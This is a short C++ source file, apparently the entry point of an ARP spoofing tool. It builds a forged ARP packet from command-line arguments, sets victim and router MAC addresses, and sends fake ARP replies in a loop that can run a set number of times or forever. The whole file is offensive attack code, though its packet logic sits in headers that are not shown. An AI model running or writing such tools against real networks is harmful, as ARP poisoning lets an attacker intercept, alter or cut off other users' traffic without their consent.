/*
 * (c) 2018 Yating Zhou
 */
#include "arpAttack.h"
#include "FakeARPPacket.h"

int main(int argc, char** argv) 
{
    int replay = (argc == 5) ? atoi(argv[4]) : 1; 
    bool forever = replay < 0;
    FakeARPPacket&& fakeARP = (argc < 4) ? FakeARPPacket() : FakeARPPacket(argv[1], argv[2], argv[3]);
    uint8_t victimMAC[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x02 };
    uint8_t routerMAC[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 };
    fakeARP.setVictimMAC(victimMAC);
    fakeARP.setRouterMAC(routerMAC);
    while (forever || replay > 0) {
        fakeARP.sendReplyPkt();
        replay--;
    }
    return 0;
}